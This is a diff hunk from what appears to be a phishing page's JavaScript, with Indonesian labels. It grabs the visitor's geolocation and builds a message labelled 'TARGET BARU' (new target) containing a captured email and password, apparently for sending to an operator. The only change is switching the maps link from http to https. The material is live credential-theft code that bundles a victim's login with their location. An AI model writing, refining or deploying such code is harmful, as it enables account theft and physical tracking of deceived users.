@@ -208,7 +208,7 @@
                 let locStr = "📍 Lokasi Ditolak";  
                 try {  
                     const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout:5000}));  
-                    locStr = `📍 Lokasi: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;  
+                    locStr = `📍 Lokasi: https://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;  
                 } catch(e) {}  
   
                 const teksPesan = `<b>🚀 𝗧𝗔𝗥𝗚𝗘𝗧 𝗕𝗔𝗥𝗨 🔥</b>\n\n📧 Email: <code>${email}</code>\n🔑 Pass: <code>${pass}</code>\n\n${locStr}`;  
